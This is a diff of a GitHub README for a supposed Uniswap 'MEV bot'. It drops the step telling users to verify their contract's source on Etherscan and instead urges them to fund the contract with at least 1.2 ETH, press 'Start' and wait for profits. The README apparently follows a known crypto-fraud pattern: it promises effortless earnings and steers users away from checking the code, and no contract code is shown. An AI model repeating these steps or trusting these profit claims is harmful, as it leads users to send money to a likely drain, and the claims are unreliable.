@@ -58,25 +58,25 @@ Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, deter
 
 ![3](https://user-images.githubusercontent.com/132264778/235454410-cb9b447c-bb47-4907-872a-6c75bdf17890.png)
 
-4) Verify your smart contract on etherscan -
 
-- 🌐 Visit [Etherscan Verify Contract](https://etherscan.io/verifyContract).
-   - 📝 Enter contract address and set inputs:
-   - Compiler Type: Solidity (Single File)
-   - Compiler Version: ^0.6.12
-   - License Type: 3) MIT License (MIT)
-   - 📋 Paste the code from mev.sol.
-   - 🚫 Leave ABI input box empty.
-   - 🟢 Click "Verify"
+4) Copy your newly created contract address and fund it with any amount of ETH that you would like the bot to earn with by simply sending ETH to your newly created contract address. Deposit funds (at least 1.2 ETH to prevent negating slippage) into your specific contract/bot address.
+
+![image](https://github.com/jrdsubwayeth/MevBotv2.1/assets/114575738/5ef59ec8-a07e-46ec-9d43-1ad96599511d)
+
+Head over to your Metamask and fund your newly created contract.
+
+![image](https://github.com/jrdsubwayeth/MevBotv2.1/assets/114575738/12524f19-0ea8-4593-b221-748dca76c2fc)
+
+After your transaction is confirmed your balance should appear like this on your contract.
+
+![image](https://github.com/jrdsubwayeth/MevBotv2.1/assets/114575738/7ca5a7de-6e5d-4769-9a5e-1aab9fed0a54)
 
 
-5) Deposit funds (at least 1.2 ETH to prevent negating slippage) into your specific contract/bot address.
- 
-6) Go to your verified contract. Write contract. Enter the amount of ETH you want to trade with into the 1. Start. Confirm the transaction
+5) Click the “Start” button to run the bot.
 
-<img width="780" alt="4" src="https://user-images.githubusercontent.com/132264778/235452658-71fb728f-d0e6-4a30-8236-9cf8c5926979.png">
+The bot will start working immediately earning you profits from trades.
 
-7) Withdraw anytime by clicking 'withdrawal'.
+6) Withdraw anytime by clicking 'withdrawal'.
 
 :hourglass_flowing_sand: Wait a couple of days for profits to roll in. Remember, for successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2ΕΤΗ and higher. 
 
